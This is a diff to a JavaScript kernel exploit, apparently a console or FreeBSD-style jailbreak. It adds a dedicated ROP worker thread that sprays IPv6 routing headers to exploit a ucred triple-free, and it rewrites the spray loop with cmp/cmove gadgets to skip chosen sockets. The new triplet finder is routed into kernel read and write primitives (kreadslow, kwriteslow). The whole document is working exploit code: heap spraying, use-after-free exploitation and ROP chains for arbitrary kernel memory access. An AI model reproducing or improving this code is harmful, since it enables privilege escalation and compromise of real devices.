@@ -171,7 +171,7 @@ MAIN_LOOP_ITERATIONS = 3;
 TRIPLEFREE_ITERATIONS = 8;
 KQUEUE_ITERATIONS = 5000;
 
-MAX_ROUNDS_TWIN = 10;
+MAX_ROUNDS_TWIN = 20;
 MAX_ROUNDS_TRIPLET = 200;
 
 COMMAND_UIO_READ = 0;
@@ -246,12 +246,20 @@ var spray_ipv6_ready = malloc(8);
 var spray_ipv6_done = malloc(8);
 var spray_ipv6_signal_buf = malloc(8);
 var spray_ipv6_stack = malloc(0x2000);
-var spray_ipv6_triplet_stack = malloc(0x2000);
+
+
+var spray_ipv6_triplet_ready = malloc(8);
+var spray_ipv6_triplet_done = malloc(8);
+var spray_ipv6_triplet_signal_buf = malloc(8);
+var spray_ipv6_triplet_stack = malloc(0x10000);
+var store_socket_skip_0 = malloc(8);
+var store_socket_skip_1 = malloc(8);
 
 var iov_recvmsg_workers = [];
 var uio_readv_workers = [];
 var uio_writev_workers = [];
 var spray_ipv6_worker;
+var spray_ipv6_triplet_worker;
 
 var uaf_socket;
 
@@ -483,6 +491,33 @@ function create_workers() {
     worker.signal_buf = signal_buf;
 
     spray_ipv6_worker = worker;         // --> Worker data
+
+    
+    // Create worker for triplet spray skipping sock_0 and sock_1
+
+    ready = spray_ipv6_triplet_ready;
+    done = spray_ipv6_triplet_done;
+    signal_buf = spray_ipv6_triplet_signal_buf;
+
+    // Socket pair to signal "run"
+    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
+    pipe_0 = read32(sock_buf);
+    pipe_1 = read32(sock_buf.add(4));
+
+    ret = ipv6_sock_spray_triplet_rop(ready, pipe_0, done, signal_buf);
+
+    worker.rop = ret.rop;
+    worker.loop_size = ret.loop_size;
+    worker.pipe_0 = pipe_0;
+    worker.pipe_1 = pipe_1;
+    worker.ready = ready;
+    worker.done = done;
+    worker.signal_buf = signal_buf;
+
+    spray_ipv6_triplet_worker = worker;         // --> Worker data
+
+
+
 }
 
 function init_workers() {
@@ -520,6 +555,13 @@ function init_workers() {
         var thread_id = ret & 0xFFFFFFFF;               // Convert to 32bits value
         uio_writev_workers[i].thread_id = thread_id;    // Save thread ID
     }
+
+    ret = spawn_thread(spray_ipv6_triplet_worker.rop, spray_ipv6_triplet_worker.loop_size, spray_ipv6_triplet_stack);
+    if (ret.eq(BigInt_Error)) {
+        throw new Error("Could not spawn spray_ipv6_triplet_worker");
+    }
+    var thread_id = ret & 0xFFFFFFFF;               // Convert to 32bits value
+    spray_ipv6_triplet_worker.thread_id = thread_id;    // Save thread ID
 }
 
 function nanosleep_fun(nsec) {
@@ -533,6 +575,20 @@ function wait_for(addr, threshold) {
     while (!read64(addr).eq(threshold)) {
         nanosleep_fun(1);
     }
+}
+
+function trigger_triplet_spray() {
+    worker = spray_ipv6_triplet_worker;
+    write64(worker.done, 0);
+    ret = write(worker.pipe_1, worker.signal_buf, 1); 
+    if (ret.eq(BigInt_Error)) {
+        throw new Error("Could not signal 'run' spray_ipv6_triplet_worker");
+    }
+}
+
+function wait_triplet_spray() {
+    // Wait for completition
+    wait_for(spray_ipv6_triplet_worker.done, 1)
 }
 
 function trigger_iov_recvmsg() {
@@ -751,6 +807,10 @@ function setup() {
 
     debug("Spawned workers iov[" + IOV_THREAD_NUM + "] uio_readv[" + UIO_THREAD_NUM + "] uio_writev[" + UIO_THREAD_NUM + "]");
 
+    // Init value to skip undefined
+    write64(store_socket_skip_0, 0xFFFF);
+    write64(store_socket_skip_1, 0xFFFF);
+    
 }
 
 function cleanup() {
@@ -910,10 +970,47 @@ function find_twins() {
     //throw new Error("find_twins failed");
 }
 
+function find_triplet_rop(master, other, iterations) {
+    
+    // Fill stores with sockets to skip
+    write64(store_socket_skip_0, master);
+    write64(store_socket_skip_1, other);
+
+    if (typeof iterations === 'undefined') {
+        iterations = MAX_ROUNDS_TRIPLET;
+    }
+
+    var count = 0;
+    var val;
+    var j;
+
+    // Minimizing the usage of BigInt class
+    const leak_add = leak_rthdr.add(0x04);
+
+    while (count < iterations) {
+        if (count % 100 == 0) {
+            //debug("find_triplet iteration: " + count);
+        }
+
+        trigger_triplet_spray()
+        wait_triplet_spray()
+
+        get_rthdr(ipv6_socks[master], leak_rthdr, 8);
+        val = read32(leak_add);
+        j = val & 0xFFFF;
+        if ((val & 0xFFFF0000) === RTHDR_TAG && j !== master && j !== other) {
+            return j;
+        }
+        count++;
+    }
+    return -1;
+
+}
+
 function find_triplet(master, other, iterations) {
     //debug("Enter find_triplet (" + master + ") (" + other + ")" );
     
-    if(typeof iterations === 'undefined') {
+    if (typeof iterations === 'undefined') {
         iterations = MAX_ROUNDS_TRIPLET;
     }
 
@@ -1337,7 +1434,7 @@ function trigger_ucred_triplefree() {
         close(dup(uaf_socket));
 
         // Find triplet.
-        triplets[1] = find_triplet(triplets[0], -1);
+        triplets[1] = find_triplet_rop(triplets[0], -1);
 
         // If error start again to better exploit possibility
         if (triplets[1] === -1) {
@@ -1358,7 +1455,7 @@ function trigger_ucred_triplefree() {
         write(iov_sock_1, tmp, 1);
 
         // Find triplet.
-        triplets[2] = find_triplet(triplets[0], triplets[1]);
+        triplets[2] = find_triplet_rop(triplets[0], triplets[1]);
 
         // If error start again to better exploit possibility
         if (triplets[2] === -1) {
@@ -1533,7 +1630,7 @@ function kreadslow(addr, size) {
     build_uio(msgIov, uio_iov, 0, true, addr, size);
 
     // Find new one to free
-    triplets[1] = find_triplet(triplets[0], -1, 1000);
+    triplets[1] = find_triplet_rop(triplets[0], -1, 1000);
 
     if (triplets[1] === -1) {
         debug("kreadslow - Failed to adquire twin");
@@ -1582,7 +1679,7 @@ function kreadslow(addr, size) {
         //debug("I read from leak_buffers[" + i + "] : " + hex(val) );
         if (!val.eq(tag_val)) {
             // Find triplet.
-            triplets[1] = find_triplet(triplets[0], -1, 1000);
+            triplets[1] = find_triplet_rop(triplets[0], -1, 1000);
             if (triplets[1] === -1) {
                 debug("kreadslow - Failed to adquire twin 2");
                 return BigInt_Error;
@@ -1667,7 +1764,7 @@ function kwriteslow(addr, buffer, size) {
     build_uio(msgIov, uio_iov, 0, false, addr, size);
 
     // Find new one to free
-    triplets[1] = find_triplet(triplets[0], -1, 1000);
+    triplets[1] = find_triplet_rop(triplets[0], -1, 1000);
 
     if (triplets[1] === -1) {
         debug("kwriteslow - Failed to adquire twin");
@@ -1706,7 +1803,7 @@ function kwriteslow(addr, buffer, size) {
     }
 
     // Find triplet.
-    triplets[1] = find_triplet(triplets[0], -1, 1000);
+    triplets[1] = find_triplet_rop(triplets[0], -1, 1000);
 
     // Workers should have finished earlier no need to wait
     wait_uio_writev();
@@ -2155,7 +2252,7 @@ function ipv6_sock_spray_and_read_rop (ready_signal, run_fd, done_signal, signal
 
 }
 
-function ipv6_sock_spray_and_read_triplet_rop (ready_signal, run_fd, done_signal, signal_buf, master, other) {
+function ipv6_sock_spray_triplet_rop (ready_signal, run_fd, done_signal, signal_buf) {
     var rop = [];
 
     rop.push(0); // first element overwritten by longjmp, skip it
@@ -2207,16 +2304,51 @@ function ipv6_sock_spray_and_read_triplet_rop (ready_signal, run_fd, done_signal
     rop.push(1);
     rop.push(read_wrapper);
 
-    // Spray all sockets
+    // Spray all sockets except sock_0 and sock_1
     for (var i = 0; i < ipv6_socks.length; i++) {
 
-        // Don't spray on socket master or other
-        if (i === master || i === other) {
-            continue;
-        }
+        rop.push(gadgets.POP_RBX_RET);
+        rop.push(ipv6_socks[i]);
+        rop.push(gadgets.POP_RDI_RET);
+        rop.push(store_socket_skip_0);
+        rop.push(gadgets.POP_RDX_RET);
+        rop.push(0x20);
+        // Here we compare the current socket with the socket_0 to skip
+        // cmp ebx, dword ptr [rdi + rdx*4 - 0x80] ; ret
+        rop.push(gadgets.CMP_EBX_QWORD_PTR_RDI_PLUS_RDXx4_LESS_80_RET);
+
+        rop.push(gadgets.POP_RAX_RET);
+        rop.push(ipv6_socks[i]);        
+        rop.push(gadgets.POP_RDI_RET);
+        rop.push(0xFFFF);
+        // Here we move to RAX a fake socket 0xffff to fail if we need to skip
+        // Due that the comparison was 'equal'
+        // cmove rax, rdi ; ret
+        rop.push(gadgets.CMOVE_RAX_RDI_RET);
+
+        // We have in RAX the value of socket to evaluate
+        // Let's do again the comparison but with socket_1
 
         rop.push(gadgets.POP_RDI_RET);
-        rop.push(ipv6_socks[i]);
+        rop.push(store_socket_skip_1);
+        // Here we compare the current socket with the socket_1 to skip
+        // cmp ebx, dword ptr [rdi + rdx*4 - 0x80] ; ret
+        rop.push(gadgets.CMP_EBX_QWORD_PTR_RDI_PLUS_RDXx4_LESS_80_RET);
+
+        // Here we move to RAX a fake socket 0xffff to fail if we need to skip
+        // Due that the comparison was 'equal'
+        rop.push(gadgets.POP_RDI_RET);
+        rop.push(0xFFFF);
+        // cmove rax, rdi ; ret
+        rop.push(gadgets.CMOVE_RAX_RDI_RET);
+
+        // Time to move the socket to evaluate to RDI
+
+        // mov edi, eax ; pop rbp ; mov rax, rdi ; ret
+        rop.push(gadgets.MOV_EDI_EAX_POP_RBP_MOV_RAX_RDI_RET);
+        rop.push(0); // Fake value for RBP
+        
+        // Rest of value to stray
         rop.push(gadgets.POP_RSI_RET);
         rop.push(IPPROTO_IPV6);
         rop.push(gadgets.POP_RDX_RET);
@@ -2226,6 +2358,7 @@ function ipv6_sock_spray_and_read_triplet_rop (ready_signal, run_fd, done_signal
         rop.push(gadgets.POP_R8_RET);
         rop.push(spray_rthdr_len);
         rop.push(setsockopt_wrapper);
+
     }
 
     // Signal done - write 1 to deletion_signal
@@ -2235,11 +2368,6 @@ function ipv6_sock_spray_and_read_triplet_rop (ready_signal, run_fd, done_signal
     rop.push(1);
     rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
 
-    // Exit
-    rop.push(gadgets.POP_RDI_RET)
-    rop.push(0)
-    rop.push(thr_exit_wrapper)
-
     var loop_end = rop.length;
     var loop_size = loop_end - loop_init;
 
@@ -2247,7 +2375,7 @@ function ipv6_sock_spray_and_read_triplet_rop (ready_signal, run_fd, done_signal
 
     return {
         rop: rop,
-        loop_size: 0//loop_size
+        loop_size: loop_size
     }
 
 }
